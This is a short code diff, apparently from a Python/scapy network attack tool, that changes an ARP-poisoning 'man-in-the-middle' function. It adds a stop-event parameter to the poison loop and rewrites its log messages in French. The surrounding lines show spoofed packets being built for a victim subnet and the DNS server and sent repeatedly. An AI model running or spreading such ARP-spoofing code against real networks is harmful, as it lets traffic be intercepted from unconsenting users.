@@ -6,9 +6,9 @@ from environment import *
 from mac_management import *
 import ipaddress
 
-def arp():
+def arp(stopEvent):
 
-	print("Starting ARP Bombing")
+	print("[ARRETE] Man-In-The-Middle ARP")
 
 	# Get self ethernet address
 	self_mac = get_if_hwaddr(str(ATTACK_STATUS['iface']))
@@ -24,7 +24,7 @@ def arp():
 	if mac_dns[0]:
 		mac_dns = mac_dns[0][0][1].hwsrc
 	else:
-		print("DNS mac not founded - aborting")
+		print("[ERROR] ARP DNS non trouvée.")
 		return
 
 	# Parse subnet of victims
@@ -54,7 +54,7 @@ def arp():
 			packets.append(p2)
 
 	#poisonloop
-	while True:
+	while True and not stopEvent.is_set():
 
 		for i in range(len(packets)):
 			sendp(packets[i], iface=str(ATTACK_STATUS['iface']), verbose=False)
